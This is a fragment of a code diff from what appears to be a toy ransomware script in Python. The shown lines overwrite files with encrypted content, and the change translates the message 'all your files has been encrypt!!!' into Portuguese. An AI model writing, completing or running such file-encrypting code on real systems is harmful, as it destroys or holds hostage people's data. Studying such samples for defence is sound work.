@@ -21,7 +21,7 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(content_encrypt)
         
-print("all your files has been encrypt!!!")
+print("todos os seus arquivos foram criptografados!!!")
 
 
 
